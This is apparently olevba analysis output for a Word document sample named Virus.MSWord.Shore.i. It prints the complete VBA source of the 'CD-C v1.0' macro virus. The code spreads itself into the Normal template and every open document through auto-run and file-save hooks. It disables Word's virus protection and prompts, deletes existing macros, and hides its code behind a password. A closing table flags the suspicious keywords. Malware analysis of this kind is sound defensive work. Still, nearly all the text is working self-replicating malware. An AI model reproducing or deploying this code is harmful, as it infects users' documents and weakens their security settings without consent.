olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CDC_v10.bas 
in file: Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961 - OLE stream: 'Macros/VBA/CDC_v10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'***** CD-C Virus v.1.0 *****
'Tembalang, Saturday, November 18, 2000
'Virus CD-C dibuat hanya sekedar iseng
'Programmer membuat virus ini karena pada Malam Minggu ini
'sendirian, tak ada yang nemenin.
'Bagi yang ingin kenalan, kirim e-mail ke mas.cdc@usa.net
'

Public Const SeriesNumber = 20001101
Public Const ModuleName = "CDC_v10", FormName = "CDC_Form", _
        mw = "Microsoft Word", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const CDE = "CD-C Electrical Engineering", _
        hcID = "Ahmad", mail = "e-mail: mas.cdc@usa.net"
        
    
Public Const msg = "Guoooblok!!! Kuncine keliru :))", _
        aaa = "fLQ-Ŕ°vtµĆ__", bbb = "iq5diani", ccc = "ssss", _
        msgcap = "Pekok...!!!", _
        code = "gathel", ddd = "Kluruk", eee = "Telp117", _
        xxx = "cdee99"
Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'Procedures in CDC module
'Procedure untuk memberi identitas pada template
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub
'Fungsi untuk mengecek identitas virus
Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function
'Fungsi untuk mengecek adanya module dalam template
Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
'Fungsi untuk mengecek keadaan virus dalam dokumen
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function
'Procedure untuk menghilangkan semua makro
Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.CodeModule
                .DeleteLines 1, .CountOfLines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub
'Procedure duplikasi makro
Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=FormName, _
            Object:=wdOrganizerObjectProjectItems
End Sub
Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub
Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).CodeModule
        .DeleteLines 1, .CountOfLines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub
'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    '**** AnimateCaption
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    '**** AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    '**** AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    '**** AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub
Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
   
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    '**** AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    For Each Combar In Application.CommandBars
     
     
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    '**** AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    '**** AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        '**** AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
    'Application.ShowVisualBasicEditor = False

End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    '**** AnimateCaption
    Stealth
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbExclamation, msgcap)
    '**** AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cdee = "CD-C " + EE
    sandi = xxx + Mid(code, 5, 2)
    If LCase(InputBox(pass, cdee)) = sandi Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    '**** AnimateCaption
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    '**** AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    '**** AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    '**** AnimateCaption
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

'Sub AnimateCaption()
'    On Error Resume Next
'    If Documents.Count > 0 Then WordBasic.viewpage
'    If Animated Then Exit Sub
'    anIntv = 2.5
'    anPos = 0
'    anCap = CDE
'    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
'    Animated = True
'End Sub
'
'
'Sub ScrollCaption()
'    If Animated Then
'        Application.Caption = Right$(anCap, anPos)
'        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
'        anPos = anPos + 1
'    End If
'
'    If anPos > Len(anCap) Then
'        On Error Resume Next
'        WordBasic.viewpage
'
'        anPos = 0
'        If anCap = CDE Then
'            anCap = Peace
'            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
'            Animated = True
'        ElseIf anCap = ddd Then
'            anCap = mw
'            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
'            Animated = True
'        ElseIf anCap = mw Then
'            anCap = OFC
'            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
'            Animated = False
'        End If
'    End If
'End Sub


Sub ShowMessage()
    With CDC_Form
        .Width = 220
        .Height = 170
        With .Judul
        .Left = 15
            .Top = 5
            .Width = 180
            .Height = 20
        End With
        With .Komentar
            .Width = 200
            .Height = 80
            .Top = 30
            .Left = 5
            .Text = "" & _
             "Dengerin nasehat symbah AM" & Chr(13) & _
             "Bermain air basah, bermain api gosong," & Chr(13) & _
             "Bermain virus asyiiik dech..." & Chr(13) & Chr(13) & _
             "CD-C EE v.10 (C) " & hcID & ", Nov, 2000" & _
             Chr(13) & mail
        End With
        With .OKButton
            .Width = 50
            .Height = 25
            .Left = 85
            .Top = 115
        End With
        .Show
    End With

End Sub

Sub HelpAbout()
   CDC_Form.Caption = "About CD-C"
   ShowMessage
End Sub


-------------------------------------------------------------------------------
VBA MACRO CDC_Form.frm 
in file: Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961 - OLE stream: 'Macros/VBA/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






























Private Sub Judul_Click()

End Sub

Private Sub OKButton_Click()
   For i = 0 To 100
     Beep
   Next i
   CDC_Form.Hide
End Sub

Private Sub UserForm_Click()
   
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CD-C Electrical Engineering
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Selamat malam dan selamat bermalam Minggu bagi yang sekarang sedang kencan bersama si do'i 
Semoga malam ini merupakan malam yang terindah, dan merupakan kenangan yang tak telupakan.
Selamat bersibuk ria dengan tugas-tugas yang diberikan Bapak Dosen, bagi yang sedang berada di rental-rental atau kamar-kamar kost.
    Salam bagi teman-teman CD-C Electrical Engineering,
    semoga kita tetap maju dan berjaya.
    
Buat semua pengidap CD-C viruses, mohon maaf bila mengganggu....!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Judul'" IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Komentar'" IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b"Selamat malam dan selamat bermalam Minggu bagi yang sekarang sedang kencan bersama si do'i \r\nSemoga malam ini merupakan malam yang terindah, dan merupakan kenangan yang tak telupakan.\r\nSelamat bersibuk ria dengan tugas-tugas yang diberikan Bapak Dosen, bagi yang sedang berada di rental-rental atau kamar-kamar kost.\r\n    Salam bagi teman-teman CD-C Electrical Engineering,\r\n    semoga kita tetap maju dan berjaya.\r\n    \r\nBuat semua pengidap CD-C viruses, mohon maaf bila mengganggu....!!"
-------------------------------------------------------------------------------
VBA FORM Variable "b'OKButton'" IN 'Virus.MSWord.Shore.i-e25016ff8bb9c83ca8e3a29a8f12cb7a52893961' - OLE stream: 'Macros/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Judul_Click         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

